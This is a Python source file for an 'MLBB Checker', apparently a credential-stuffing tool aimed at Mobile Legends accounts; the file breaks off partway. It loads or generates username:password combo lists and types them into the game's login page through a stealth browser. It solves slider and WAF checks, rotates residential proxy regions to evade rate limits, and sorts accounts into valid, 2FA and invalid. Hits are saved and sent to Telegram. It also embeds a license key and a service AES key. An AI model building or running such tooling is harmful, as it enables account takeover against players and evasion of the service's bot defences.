# -*- coding: utf-8 -*-
# ============================================================================
#  MLBB Checker v9.0 — Python Native Browser Checker (CloakBrowser)
#  
#  Struktur arsitektur : proxy.py (worker, queue, UI progress, proxy testing)
#  Logika bisnis       : checker.js (klasifikasi, dekripsi AES, rotasi region DataImpulse,
#                        generator combo nama 10.000 dunia, resume, output txt, Telegram)
#  Metode input        : Human typing langsung di browser (bukan POST / fetch)
#  Slider solver       : CDP Touch Events (_human_drag + solve_waf dari proxy.py)
# ============================================================================
import asyncio
import atexit
import argparse
import base64
import datetime
from collections import deque
import hashlib
import json
import math
import os
import random
import re
import signal
import subprocess
import sys
import time
import zlib
# ponytail: unshadow stdlib http for urllib.request, then restore script dir so info.py imports
_script_dir = os.path.dirname(os.path.abspath(__file__))
_popped_cwd = False
if sys.path and os.path.abspath(sys.path[0]) == _script_dir:
    sys.path.pop(0)
    _popped_cwd = True
import urllib.parse
import urllib.request
if _popped_cwd:
    sys.path.insert(0, _script_dir)

# Global emergency PID tracker to prevent zombie processes (Cross-platform: Windows/Linux/Termux)
_driver_pid = None
_pw_instance = None

CLOAKBROWSER_LICENSE_KEY_DEFAULT = "cb_3c59a9fa1a2841aeab3194b483542320"
_ACTIVE_LICENSE_KEY = ""
_LICENSE_SESSION_ACTIVE = False

def _cloak_cache_dir() -> str:
    try:
        from cloakbrowser.config import get_cache_dir
        return str(get_cache_dir())
    except Exception:
        return os.environ.get("CLOAKBROWSER_CACHE_DIR") or os.path.join(os.path.expanduser("~"), ".cloakbrowser")

def activate_cloak_license(explicit_key: str = "") -> str:
    """Aktifkan license key CloakBrowser secara ephemeral untuk sesi run ini saja."""
    global _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
    key = (explicit_key or os.environ.get("CLOAKBROWSER_LICENSE_KEY", "") or CLOAKBROWSER_LICENSE_KEY_DEFAULT).strip()
    if key:
        _ACTIVE_LICENSE_KEY = key
        os.environ["CLOAKBROWSER_LICENSE_KEY"] = key
        _LICENSE_SESSION_ACTIVE = True
    return key

def withdraw_cloak_license() -> None:
    """Tarik license key & cache CloakBrowser dari device ini setelah run selesai."""
    global _ACTIVE_LICENSE_KEY, _LICENSE_SESSION_ACTIVE
    _ACTIVE_LICENSE_KEY = ""
    _LICENSE_SESSION_ACTIVE = False
    os.environ.pop("CLOAKBROWSER_LICENSE_KEY", None)
    cdir = _cloak_cache_dir()
    for fname in ("license.key", ".license_cache", ".license_cache.tmp", ".free_claim"):
        fp = os.path.join(cdir, fname)
        try:
            if os.path.exists(fp):
                os.unlink(fp)
        except Exception:
            pass

def _emergency_cleanup():
    global _driver_pid
    if _driver_pid:
        try:
            if os.name == 'nt':
                subprocess.run(f"taskkill /F /T /PID {_driver_pid}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                try:
                    os.killpg(os.getpgid(_driver_pid), signal.SIGKILL)
                except Exception:
                    subprocess.run(f"kill -9 {_driver_pid} 2>/dev/null", shell=True)
                    subprocess.run(f"pkill -P {_driver_pid} -9 2>/dev/null", shell=True)
        except Exception:
            pass
        _driver_pid = None
    if _LICENSE_SESSION_ACTIVE:
        withdraw_cloak_license()

atexit.register(_emergency_cleanup)

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding='utf-8', errors='backslashreplace')
    except Exception:
        pass

# ── Dependencies ─────────────────────────────────────────────────────────────
try:
    from cloakbrowser import launch_async
except ImportError:
    print("[!] cloakbrowser belum terinstal: pip install cloakbrowser")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] pycryptodome belum terinstal: pip install pycryptodome")
    sys.exit(1)

try:
    import colorama
    if hasattr(colorama, 'just_fix_windows_console'):
        colorama.just_fix_windows_console()
    else:
        colorama.init()
except Exception:
    pass

# ── Optional: info.py (Player profile lookup) ────────────────────────────────
INFO_OK = False
get_player_info = None
DeviceManager = None
INFO_IMPORT_ERR = None

try:
    from info import get_player_info as _gpi, DeviceManager as _DM
    get_player_info = _gpi
    DeviceManager = _DM
    INFO_OK = True
except Exception as _e:
    INFO_IMPORT_ERR = f"{type(_e).__name__}: {_e}"

# ── Paths & Globals ──────────────────────────────────────────────────────────
BASE         = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(BASE, '..'))
OUTPUT_DIR   = os.path.join(BASE, 'output')
DEVICES_FILE = os.path.join(BASE, 'devices.txt')
os.makedirs(OUTPUT_DIR, exist_ok=True)

LOGIN_PAGE   = 'https://mtacc.mobilelegends.com/v3.0/inapp/login-new'
API_URL      = 'https://mtpassapi.mobilelegends.com/mpass'  # NOTE: tidak dipakai langsung; respons ditangkap via page.on("response")

# Kunci kriptografi Moonton (dari module 284 / checker.js)
AES_KEY = b'9eecd7fdd903ad7d009d281a91619639'

# Telegram Config (Optional via ENV)
TG_TOKEN = os.environ.get('TG_TOKEN', '')
TG_CHAT  = os.environ.get('TG_CHAT', '')
TG_ON    = bool(TG_TOKEN and TG_CHAT)

# Defaults
HEADLESS             = True
NUM_CONTEXTS         = 1
MAX_WAF_RETRY        = 2   # FIX: 4→2; worst-case 1 new context per akun, bukan 2
ACCOUNTS_PER_SESSION = 150  # FIX: 25→150; kurangi frekuensi full page reload (~17MB/reload)
DEBUG                = False
PROXY_ENABLED        = False
PROXY_FILE           = ''
PROXY_TEST_TIMEOUT   = 15

# FIX: Cache storage state browser agar aset CDN (alicdn, moontontech) tidak
# di-download ulang tiap new_context. File dihapus otomatis jika sudah > 1 hari.
CACHE_STATE_FILE     = os.path.join(BASE, '.browser_cache_state.json')

# Output files
FILES = {
    'VALID': 'hit_valid.txt',
    'OTP': 'hit_2fa.txt',
    'INVALID': 'invalid.txt',
    'ERR': 'err.txt'
}

# ── UI & Color Styling (proxy.py style) ───────────────────────────────────────
RESET = '\033[0m'; DIM = '\033[2m'; BD = '\033[1m'
def rgb(r, g, b): return f"\033[38;2;{r};{g};{b}m"
CYAN   = (75, 220, 255)
PURPLE = (175, 95, 255)
GREEN  = (80, 235, 155)
GOLD   = (255, 205, 80)
RED    = (255, 85, 105)
WHITE  = (238, 242, 255)
GRAY   = (125, 135, 160)
G = '\033[92m'; R = '\033[91m'; Y = '\033[93m'; W = '\033[0m'
def c(co): return rgb(*co)

def p_out(t, end="\n"):
    try:
        print(t, end=end, flush=True)
    except Exception:
        print(t.encode("ascii", "ignore").decode(), end=end, flush=True)

def clear_line():
    p_out("\033[2K\r", end="")

def now():
    return datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def dbg(msg):
    if DEBUG and not _TUI_ACTIVE:
        clear_line()
        clean = str(msg).strip()
        if len(clean) > 95:
            clean = clean[:92] + '...'
        p_out(f"  {c(GRAY)}[{now()[11:]}]{W} {clean}")
        print_progress()

def shortpath(path_str):
    try:
        r = os.path.relpath(path_str, BASE)
        return path_str if r.startswith("..") else r
    except Exception:
        return str(path_str)

stats = {
    'valid': 0, 'invalid': 0, 'otp': 0, 'error': 0, 'waf': 0,
    'checked': 0, 'total': 0, 'start': 0.0, 'waf_solved': 0,
    'proxy_ctx': 0,
    'rank_mythic': 0, 'rank_legend': 0, 'rank_epic': 0, 'rank_other': 0,
    'peak_skins': 0, 'peak_lvl': 0,
    'proxy_label': 'None', 'workers': 0, 'status': 'RUNNING',
    'bytes_used': 0,
}

_TUI_ACTIVE = False
_LAST_RENDER = 0.0
_LIVE_LOGS = deque(maxlen=4)
_TOP_HITS = []
_ANSI_RE = re.compile(r'\033\[[0-9;]*m')

def _fmt_bytes(b: int) -> str:
    if b < 1024: return f"{b} B"
    if b < 1048576: return f"{b/1024:.1f} KB"
    if b < 1073741824: return f"{b/1048576:.2f} MB"
    return f"{b/1073741824:.2f} GB"

def _vis_len(s: str) -> int:
    return len(_ANSI_RE.sub('', s))

def _pad(s: str, w: int) -> str:
    n = w - _vis_len(s)
    return s + (' ' * max(0, n))

def _box_line(inner: str, w: int = 68, bc: tuple = RED) -> str:
    return f"{c(bc)}│{W} {_pad(inner, w - 4)} {c(bc)}│{W}"

def render_dashboard(force: bool = False):
    global _LAST_RENDER
    if not _TUI_ACTIVE:
        return
    now_t = time.time()
    if not force and (now_t - _LAST_RENDER) < 0.2:
        return
    _LAST_RENDER = now_t

    W_OUT = 68
    W_IN = W_OUT - 4
    el = int(max(now_t - stats['start'], 0))
    el_str = f"{el // 3600}:{(el % 3600) // 60:02d}:{el % 60:02d}"
    ck, tot = stats['checked'], stats['total']
    rate = ck / max(now_t - stats['start'], 0.001)
    pct = (ck / tot * 100) if tot else 0.0

    st = stats['status']
    if st == 'WAF_WAIT':
        badge = f"\033[41;97m ! WAF / ROTATE \033[0m"
    elif st == 'DONE':
        badge = f"\033[42;30m + FINISHED \033[0m"
    else:
        badge = f"\033[42;30m * RUNNING \033[0m"

    bar_w = 34
    filled = int(pct / 100 * bar_w)
    pbar = f"{c(RED)}{'█'*filled}{c(GRAY)}{'░'*(bar_w-filled)}{W}"
    prog_str = f" {pbar}  {c(GOLD)}{pct:5.1f}%{W}  {c(WHITE)}{ck:,}/{tot:,}{W}  {c(CYAN)}{rate:.1f}/s{W}"

    out_lines = []
    # Top outer border: exact 68 chars
    title = f" * {c(PURPLE)}{BD}MLBB FAST CHECKER v9.0{W} {c(CYAN)}@BrowserEngine{W} * "
    tl = _vis_len(title)
    top_inner = W_OUT - 2
    left_d = (top_inner - tl) // 2
    right_d = top_inner - tl - left_d
    out_lines.append(f"{c(RED)}╭{'─'*left_d}{title}{c(RED)}{'─'*right_d}╮{W}")

    # Row 1: Elapsed | Workers | Status
    hdr_left = _pad(f"  {c(WHITE)}elapsed {el_str}{W}     {c(GREEN)}* {stats['workers']}/{stats['workers']} workers{W}", W_IN - _vis_len(badge))
    out_lines.append(_box_line(f"{hdr_left}{badge}", W_OUT))

    # Row 2: Compact Proxy + Real-Time Quota bar
    q_str = _fmt_bytes(stats['bytes_used'])
    px_txt = f"  {c(GRAY)}Proxy:{W} {c(CYAN)}{stats['proxy_label'][:26]}{W} {c(GRAY)}│ CTX:{W} {c(PURPLE)}{stats['proxy_ctx']}{W} {c(GRAY)}│ Quota:{W} {c(GOLD)}{q_str}{W}"
    out_lines.append(_box_line(px_txt, W_OUT))

    # Row 3: Progress box
    out_lines.append(_box_line(f"{c(GOLD)}┌{'─'*(W_IN-2)}┐{W}", W_OUT))
    out_lines.append(_box_line(f"{c(GOLD)}│{W}{_pad(prog_str, W_IN-2)}{c(GOLD)}│{W}", W_OUT))
    out_lines.append(_box_line(f"{c(GOLD)}└{'─'*(W_IN-2)}┘{W}", W_OUT))

    # Row 4: Two-column STATS + TIER (5 inner rows)
    LW = 29
    RW = W_IN - LW - 1
    l_title = f"- {c(CYAN)}STATS{W}{c(PURPLE)} -"
    r_title = f"- {c(CYAN)}TIER / PEAK{W}{c(PURPLE)} -"
    out_lines.append(_box_line(
        f"{c(PURPLE)}┌{'─'*6}{l_title}{'─'*(LW-8-_vis_len('- STATS -'))}┐{W} "
        f"{c(PURPLE)}┌{'─'*6}{r_title}{'─'*(RW-8-_vis_len('- TIER / PEAK -'))}┐{W}", W_OUT
    ))
    stat_rows = [
        (f" {c(GRAY)}TOTAL{W}",     f"{c(WHITE)}{ck:,}{W}",                f" {c(GRAY)}MYTHIC+{W}",    f"{c(GOLD)}{stats['rank_mythic']}{W}"),
        (f" {c(GRAY)}VALID{W}",     f"{c(GREEN)}{stats['valid']:,}{W}",     f" {c(GRAY)}LEGEND/EPIC{W}",f"{c(PURPLE)}{stats['rank_legend']}/{stats['rank_epic']}{W}"),
        (f" {c(GRAY)}INVALID{W}",   f"{c(RED)}{stats['invalid']:,}{W}",     f" {c(GRAY)}WAF SOLVE{W}",  f"{c(CYAN)}{stats['waf_solved']:,}{W}"),
        (f" {c(GRAY)}2FA / OTP{W}", f"{c(GOLD)}{stats['otp']:,}{W}",        f" {c(GRAY)}WAF HITS{W}",   f"{c(PURPLE)}{stats['waf']:,}{W}"),
        (f" {c(GRAY)}ERROR{W}",     f"{c(GRAY)}{stats['error']:,}{W}",      f" {c(GRAY)}PEAK SKINS{W}", f"{c(GOLD)}{stats['peak_skins'] or 'N/A'}{W}"),
    ]
    for lk, lv, rk, rv in stat_rows:
        l_cell = _pad(f"{_pad(lk, 16)}{lv}", LW - 2)
        r_cell = _pad(f"{_pad(rk, 17)}{rv}", RW - 2)
        out_lines.append(_box_line(f"{c(PURPLE)}│{W}{l_cell}{c(PURPLE)}│{W} {c(PURPLE)}│{W}{r_cell}{c(PURPLE)}│{W}", W_OUT))
    out_lines.append(_box_line(f"{c(PURPLE)}└{'─'*(LW-2)}┘{W} {c(PURPLE)}└{'─'*(RW-2)}┘{W}", W_OUT))

    # Row 5: Top Hits box
    th_title = f" {c(GOLD)}TOP HITS{W} "
    th_d = (W_IN - 2 - _vis_len(" TOP HITS ")) // 2
    out_lines.append(_box_line(f"{c(GOLD)}┌{'─'*th_d}{th_title}{c(GOLD)}{'─'*(W_IN-2-th_d-_vis_len(' TOP HITS '))}┐{W}", W_OUT))
    if not _TOP_HITS:
        empty_th = f"{' '*19}{c(GRAY)}No valid hits yet{W}"
        out_lines.append(_box_line(f"{c(GOLD)}│{W}{_pad(empty_th, W_IN-2)}{c(GOLD)}│{W}", W_OUT))
    else:
        for th in _TOP_HITS[:1]:
            out_lines.append(_box_line(f"{c(GOLD)}│{W}{_pad(' ' + th, W_IN-2)}{c(GOLD)}│{W}", W_OUT))
    out_lines.append(_box_line(f"{c(GOLD)}└{'─'*(W_IN-2)}┘{W}", W_OUT))

    # Row 6: Live Log box (4 rows -> total frame = 23 lines, fits 24-row terminals with zero scroll)
    ll_title = f" {c(PURPLE)}LIVE LOG{W} "
    ll_d = (W_IN - 2 - _vis_len(" LIVE LOG ")) // 2
    out_lines.append(_box_line(f"{c(PURPLE)}┌{'─'*ll_d}{ll_title}{c(PURPLE)}{'─'*(W_IN-2-ll_d-_vis_len(' LIVE LOG '))}┐{W}", W_OUT))
    log_snapshot = list(_LIVE_LOGS)
    for row_i in range(4):
        entry = log_snapshot[row_i] if row_i < len(log_snapshot) else ""
        out_lines.append(_box_line(f"{c(PURPLE)}│{W}{_pad(entry, W_IN-2)}{c(PURPLE)}│{W}", W_OUT))
    out_lines.append(_box_line(f"{c(PURPLE)}└{'─'*(W_IN-2)}┘{W}", W_OUT))

    # Bottom outer border
    out_lines.append(f"{c(RED)}╰{'─'*(W_OUT-2)}╯{W}")

    out_buf = "\033[H" + "\n".join(ln + "\033[K" for ln in out_lines) + "\033[J"
    try:
        sys.stdout.write(out_buf)
        sys.stdout.flush()
    except Exception:
        pass

def print_progress():
    render_dashboard()

def print_result(rtype, email, password, msg=""):
    idx = stats['checked']
    acc = f"{email}:{password}"
    if len(acc) > 26:
        acc = acc[:23] + "..."
    if rtype == "INVALID":
        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(RED)}✗{W}  {c(GRAY)}{_pad(acc, 26)}{W} {c(RED)}{msg[:22]}{W}")
    elif rtype == "OTP":
        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GOLD)}★{W}  {c(WHITE)}{_pad(acc, 26)}{W} {c(GOLD)}2FA {msg[:18]}{W}")
    elif rtype in ("ERR", "WAF", "ERROR"):
        _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GRAY)}!{W}  {c(GRAY)}{_pad(acc, 26)}{W} {c(GRAY)}{(msg or 'Timeout')[:22]}{W}")
    if not _TUI_ACTIVE:
        p_out(f"  [{rtype}] {email}:{password} -> {msg}")
    else:
        render_dashboard()

def print_hit(email, password, d, info=None):
    idx = stats['checked']
    bi, gi, ci = {}, {}, {}
    if info and info.get('status') == 'success':
        bi = info.get('data', {}).get('basic_info', {})
        gi = info.get('data', {}).get('game_info', {})
        ci = info.get('data', {}).get('collector_info', {})

    rank = str(gi.get('current_rank', '') or '')
    r_low = rank.lower()
    if 'mythic' in r_low: stats['rank_mythic'] += 1
    elif 'legend' in r_low: stats['rank_legend'] += 1
    elif 'epic' in r_low: stats['rank_epic'] += 1
    else: stats['rank_other'] += 1

    try:
        lvl = int(bi.get('level') or 0)
        if lvl > stats['peak_lvl']: stats['peak_lvl'] = lvl
    except (ValueError, TypeError):
        lvl = 0
    try:
        skins = int(bi.get('skin_count') or 0)
        if skins > stats['peak_skins']: stats['peak_skins'] = skins
    except (ValueError, TypeError):
        skins = 0

    tier_label = ci.get('collector_tier', '') or 'VALID'
    acc = f"{email}:{password}"
    if len(acc) > 26:
        acc = acc[:23] + "..."
    detail = f"Lv{lvl} {skins}Skins" if (lvl or skins) else tier_label
    _LIVE_LOGS.append(f" {c(GRAY)}{idx:>4}{W}  {c(GREEN)}✓{W}  {c(GREEN)}{_pad(acc, 26)}{W} {c(GREEN)}{detail[:26]}{W}")
    _TOP_HITS.insert(0, f"{c(GREEN)}{email}:{password}{W} {c(GOLD)}│ Lv{lvl} │ {skins} Skins │ {rank or tier_label}{W}")
    del _TOP_HITS[5:]

    if not _TUI_ACTIVE:
        p_out(f"  [HIT] {email}:{password} ({detail})")
    else:
        render_dashboard(force=True)

# ── Cryptography & Payload Parsing (checker.js 1:1) ─────────────────────────
def decrypt_payload(b64_str: str) -> str:
    """Port 1:1 fungsi decryptPayload dari checker.js.
    
    Format ciphertext dari Moonton:
      - byte terakhir = jumlah padding yang ditambahkan (bukan PKCS7 standar,
        tapi skema custom: flag byte di-append setelah ciphertext)
      - body = raw[:-1] (ciphertext AES tanpa flag byte)
      - setelah decrypt: potong (16 - flag) % 16 byte dari belakang
    Guard: pastikan body merupakan kelipatan 16 sebelum decrypt.
    """
    try:
        if not b64_str:
            return ""
        raw = base64.b64decode(b64_str)
        if len(raw) < 2:
            return ""
        flag = raw[-1]           # byte terakhir = padding count hint
        body = raw[:-1]          # sisa = ciphertext murni
        # Ciphertext AES-CBC harus kelipatan 16
        if len(body) == 0 or len(body) % 16 != 0:
            dbg(f"decrypt_payload: bad body length {len(body)}")
            return ""
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv=b'\x00' * 16)
        pt = cipher.decrypt(body)
        # Hitung berapa byte hasil padding yang perlu dipotong
        pad_cut = (16 - flag) % 16
        n = len(pt) - pad_cut
        if n <= 0:
            dbg(f"decrypt_payload: pad_cut {pad_cut} >= plaintext len {len(pt)}")
            return ""
        return pt[:n].decode('utf-8', errors='ignore')
    except Exception as e:
        dbg(f"decrypt_payload error: {e}")
        return ""

def classify(j: dict | None) -> str:
    """Klasifikasi status response berdasarkan kode error Moonton."""
    if not j:
        return 'WAF'
    if j.get('__waf'):
        return 'WAF'
    
    code = j.get('code')
    msg  = str(j.get('message', ''))
    
    if code == 0:
        return 'VALID'
    # ponytail: 1004 & 1087 are invalid; avoid loose 'Email' in msg false positives
    if code in (1002, 1004, 1005, 1087) or re.search(r'PasswdError|LoginPwd_Fail|PwdError|wrong_pass|account.*not.*exist', msg, re.I):
        return 'INVALID'
    if code in (1086, 1065) or re.search(r'SendEmail|EmailCode|TwoFactor|VerifyEmail', msg, re.I):
        return 'OTP'
    if code in (1036, -2) or re.search(r'FailedTooMuch|TooMuch', msg, re.I):
        return 'RATE'
    return 'UNKNOWN'

# ── File Output & Telegram Alerts ───────────────────────────────────────────
def append_line(filename: str, line: str):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    path = os.path.join(OUTPUT_DIR, filename)
    with open(path, 'a', encoding='utf-8') as f:
        f.write(line + '\n')

def esc_html(s: str) -> str:
    return str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')

async def send_tg(text: str):
    if not TG_ON:
        return
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        payload = json.dumps({'chat_id': TG_CHAT, 'text': text, 'parse_mode': 'HTML'}).encode('utf-8')
        req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, urllib.request.urlopen, req)
    except Exception:
        pass

def load_done() -> set[str]:
    """Resume: kumpulkan akun yang sudah selesai dari output files."""
    done = set()
    for fn in (FILES['VALID'], FILES['OTP'], FILES['INVALID']):
        fp = os.path.join(OUTPUT_DIR, fn)
        if os.path.exists(fp):
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            u = line.split(':')[0].split('|')[0].strip()
                            if u:
                                done.add(u.lower())
            except Exception:
                pass
    return done

def load_combos(path: str) -> list[tuple[str, str]]:
    out = []
    if not os.path.exists(path):
        p_out(f"{R}[!] File tidak ditemukan: {path}{W}")
        sys.exit(1)
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for ln in f:
            ln = ln.strip()
            if not ln or ln.startswith('#'):
                continue
            if ':' in ln:
                u, p = ln.split(':', 1)
                p = p.split('|', 1)[0]
                out.append((u.strip(), p.strip()))
            else:
                out.append((ln.strip(), ln.strip()))
    return out

# ── Multinational Names & Combo Generator (checker.js 1:1) ───────────────────
FALLBACK_NAMES = [
    'Yilmaz','Kaya','Demir','Celik','Sahin','Yildiz','Ozturk','Aydin','Ozdemir','Arslan',
    'Reyes','Santos','Cruz','Bautista','Garcia','Torres','Mendoza','Rivera','Flores','Gonzales',
    'Cahyo','Dinda','Gilang','Imam','Rinto','Sutarman','Wawan','Yayan','Putera','Hilman',
    'Sombat','Thawin','Saran','Tongdee','Noppadon','Suwimon','Praew','Teerayut','Natchaya','Supawadee',
    'Sokun','Veasna','Chantrea','Sothea','Roeun','Sambath','Visal','Dara','Koaung','Reaksmey',
    'Vuong','Thao','Viet','Binh','Truong','Duong','Luu','Tinh','Phung','Thien',
    'Ivanov','Smirnov','Kuznetsov','Popov','Sokolov','Lebedev','Kozlov','Morozov','Petrov','Volkov',
    'Rossi','Russo','Ferrari','Esposito','Bianchi','Romano','Colombo','Ricci','Marino','Moretti',
    'Silva','Souza','Oliveira','Pereira','Lima','Carvalho','Almeida','Ferreira','Rodrigues','Gomes',
    'Tyler','Steven','Gordon','Morgan','Bradley','Wallace','Harrison','Wilson','Douglas','Franklin',
    'Zulaikha','Maisarah','Saidatul','Rosnani','Noraini','Mastura','Zainal','Luqman','Azlan','Danial',
    'Aungsoe','Kyawzaw','Minkhant','Htutwin','Nandar','Zawwin','Shoon','Pwint','Thurakyaw','Minthu'
]

PREFIXES = ['the', 'The', 'its', 'Its', 'itss', 'real', 'mr', 'pro', 'king']
SUFFIXES = [
    '0','1','2','3','4','5','6','7','8','9','01','02','03','04','05','06','07','08','09','10',
    '11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30',
    '31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50',
    '100','123','143','321','404','420','515','520','666','777','888','999','1234','2020','2021',
    '2022','2023','2024','2025','2026','13579','24680','6969'
]

cached_names = None

def load_names() -> list[str]:
    global cached_names
    if cached_names:
        return cached_names
    candidates = [
        os.path.join(BASE, 'nama_10000.txt'),
        os.path.join(PROJECT_ROOT, 'Base', 'nama_10000.txt'),
        'nama_10000.txt'
    ]
    raw_list = []
    for p in candidates:
        if os.path.exists(p):
            try:
                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        s = line.strip()
                        s = re.sub(r'[^a-zA-Z]', '', s)
                        if 2 <= len(s) <= 16:
                            raw_list.append(s[0].upper() + s[1:].lower())
                if len(raw_list) >= 500:
                    break
            except Exception:
                pass
    combined = list(dict.fromkeys(raw_list + FALLBACK_NAMES))
    cached_names = combined if combined else FALLBACK_NAMES
    return cached_names

def gen_pass(user: str) -> str:
    if not user:
        return user
    return user[0].upper() + user[1:].lower()

def random_username(names: list[str]) -> tuple[str, bool]:
    r_type = random.random()
    is_pfx = False
    if r_type < 0.78:
        user = random.choice(names) + random.choice(SUFFIXES)
    elif r_type < 0.88:
        is_pfx = True
        user = random.choice(PREFIXES) + random.choice(names)
        if random.random() < 0.3:
            user += random.choice(SUFFIXES)
    elif r_type < 0.94:
        n = random.choice(names)
        user = (n + n.lower()) if random.random() < 0.5 else (n + random.choice(names))
        if random.random() < 0.5:
            user += random.choice(SUFFIXES)
    else:
        user = random.choice(names) + str(random.randint(1, 999))

    r_case = random.random()
    if r_case < 0.15:
        user = user.upper()
    elif r_case < 0.35:
        user = user.lower()

    return user, is_pfx

def generate_combo(count: int) -> str:
    names = load_names()
    gen_dir = os.path.join(BASE, 'gen')
    os.makedirs(gen_dir, exist_ok=True)
    out_file = os.path.join(gen_dir, f"gen_{int(time.time()*1000)}.txt")
    seen = set()
    lines = []

    while len(lines) < count:
        user, is_pfx = random_username(names)
        key = user.lower()
        if key in seen:
            continue
        seen.add(key)
        pw = gen_pass(user)
        if is_pfx and random.random() < 0.35 and not pw.endswith('123'):
            pw += '123'
        elif random.random() < 0.06:
            pw += str(random.randint(10, 99))
        lines.append(f"{user}:{pw}")

    with open(out_file, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')
    p_out(f"{c(GREEN)}[*] Generated {len(lines):,} combo (dari {len(names)} pool nama) → {shortpath(out_file)}{W}")
    return out_file

# ── DataImpulse Proxy & Region Rotation (checker.js 1:1) ─────────────────────
# Urutan: region Asia-SEA dulu (paling stabil untuk MLBB), baru sisanya
# Jangan masukkan negara yang selalu ERR_TUNNEL (AF, AX, AL, DZ, AD, AI, AO, dll)
DATAIMPULSE_REGIONS = ['sg', 'id', 'ph', 'my', 'th', 'vn', 'jp', 'tw', 'kr',
                       'hk', 'in', 'au', 'us']
# Negara yang terbukti ERR_TUNNEL → di-skip saat rotasi
_TUNNEL_BLACKLIST = {
    'af','ax','al','dz','ad','ai','ao','aq','am','aw','az',
    'bs','bh','bd','bb','by','bz','bj','bt','bo','ba',
    'cf','td','km','cd','cg','ck','ci','cn','cu','cy',
    'dj','dm','er','et','fj','ga','gm','ge','gh','gn','gw','gy',
    'ht','hn','is','iq','ir','jm','jo','kz','ke','ki','kw','kg',
    'la','lb','ls','lr','ly','li','mg','mw','mv','ml','mh','mr','mu','mn','me','mz',
    'na','nr','np','ni','ne','ng','mk','om','pk','pw','ps','pa','pg','py','pe',
    'rw','ws','st','sa','sn','rs','sl','sb','so','ss','lk','sd','sr','sz',
    'sy','tj','tz','tl','tg','to','tt','tn','tm','ug','uy','uz',
    'vu','ve','ye','zm','zw'
}
region_counter = 0
session_counter = 0
cached_countries = None
# FIX: Lock diinisialisasi lazy di dalam event loop (bukan module-level) untuk
# kompatibilitas Python 3.9 ke bawah yang tidak boleh buat Lock di luar event loop.
_rotation_lock: asyncio.Lock | None = None

def _get_rotation_lock() -> asyncio.Lock:
    global _rotation_lock
    if _rotation_lock is None:
        _rotation_lock = asyncio.Lock()
    return _rotation_lock

def load_countries() -> list[dict]:
    candidates = [
        os.path.join(BASE, 'countries.json'),
        os.path.join(PROJECT_ROOT, 'Base', 'countries.json'),
        'countries.json'
    ]
    for p in candidates:
        if os.path.exists(p):
            try:
                with open(p, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                if isinstance(data, list) and data:
                    return data
            except Exception:
                pass
    return []

def get_countries_data():
    global cached_countries
    if cached_countries:
        return cached_countries
    raw = load_countries()
    c_map = {}
    codes = []
    for item in raw:
        code = item.get('code')
        if code:
            cd = code.lower()
            c_map[cd] = item.get('name') or cd.upper()
            codes.append(cd)
    cached_countries = {'map': c_map, 'codes': codes}
    return cached_countries

def parse_dataimpulse_user(user_str: str) -> tuple[str, list[str]]:
    if not user_str:
        return '', DATAIMPULSE_REGIONS
    parts = user_str.split('__')
    token = parts[0]
    regions = []
    for p in parts[1:]:
        if p.startswith('cr.'):
            regions = [s.strip().lower() for s in p[3:].split(',') if s.strip()]
    return token, (regions if regions else DATAIMPULSE_REGIONS)

def rotated_user(base_user: str, server: str = '', session_id: str = '') -> dict:
    """FIX: region_counter & session_counter diproteksi. Mendukung sticky session_id."""
    global region_counter, session_counter
    if not base_user:
        return {'user': '', 'region': 'DIRECT', 'countryName': 'Direct', 'session': ''}
    
    # KETAT: Rotasi username & negara HANYA untuk proxy DataImpulse (__cr. atau domain dataimpulse)
    is_dataimpulse = ('__cr.' in base_user) or ('dataimpulse' in str(server).lower())
    if not is_dataimpulse:
        return {
            'user': base_user,
            'region': 'PROXY',
            'countryName': 'Standard',
            'session': ''
        }

    sess = session_id if session_id else f"{int(time.time()*1000):x}{session_counter:x}"
    if not session_id:
        session_counter += 1
    
    c_data = get_countries_data()
    c_map, all_codes = c_data['map'], c_data['codes']
    token, regions = parse_dataimpulse_user(base_user)

    # Bangun pool: region dari username → DATAIMPULSE_REGIONS → all_codes, skip blacklist
    pool = (
        [r for r in regions if r not in _TUNNEL_BLACKLIST] +
        [r for r in DATAIMPULSE_REGIONS if r not in regions and r not in _TUNNEL_BLACKLIST] +
        [r for r in all_codes if r not in regions and r not in DATAIMPULSE_REGIONS and r not in _TUNNEL_BLACKLIST]
    )
    if not pool:
        pool = DATAIMPULSE_REGIONS  # ultimate fallback
    if session_id:
        fast_pool = [r for r in DATAIMPULSE_REGIONS if r not in _TUNNEL_BLACKLIST] or pool
        idx = zlib.crc32(session_id.encode('utf-8')) % len(fast_pool)
        reg = fast_pool[idx]
    else:
        reg = pool[region_counter % len(pool)]
        region_counter += 1
    name = c_map.get(reg) or reg.upper()
    return {
        'user': f"{token}__cr.{reg}__s_{sess}",
        'region': reg.upper(),
        'countryName': name,
        'session': sess
    }

async def rotated_user_async(base_user: str, server: str = '', session_id: str = '') -> dict:
    """FIX: Versi async dari rotated_user() dengan lock untuk proteksi race condition."""
    async with _get_rotation_lock():
        return rotated_user(base_user, server, session_id)

# ── General Proxy Parsing (Universal Multi-Format Support) ─────────────────
